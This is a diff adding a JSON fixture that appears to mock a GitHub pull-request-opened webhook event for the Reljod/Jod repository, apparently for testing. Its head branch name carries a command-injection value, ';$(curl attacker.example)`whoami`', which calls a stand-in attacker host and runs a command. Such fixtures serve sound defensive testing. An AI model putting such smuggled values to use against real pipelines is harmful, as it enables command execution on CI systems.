@@ -1,0 +1,33 @@
+{
+  "action": "opened",
+  "number": 62,
+  "pull_request": {
+    "number": 62,
+    "title": "chore: tidy",
+    "body": "nothing to see",
+    "state": "open",
+    "draft": false,
+    "merged": false,
+    "html_url": "https://github.com/Reljod/Jod/pull/62",
+    "author_association": "OWNER",
+    "user": { "login": "Reljod", "id": 12345678 },
+    "labels": [{ "name": "jod" }],
+    "head": {
+      "ref": "feat/x;$(curl attacker.example)`whoami`",
+      "sha": "0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f0f",
+      "repo": { "full_name": "Reljod/Jod" }
+    },
+    "base": {
+      "ref": "main",
+      "sha": "1a2b3c4d5e6f708192a3b4c5d6e7f8091a2b3c4d",
+      "repo": { "full_name": "Reljod/Jod" }
+    }
+  },
+  "repository": {
+    "full_name": "Reljod/Jod",
+    "default_branch": "main",
+    "private": true,
+    "owner": { "login": "Reljod", "id": 12345678 }
+  },
+  "sender": { "login": "Reljod", "id": 12345678 }
+}
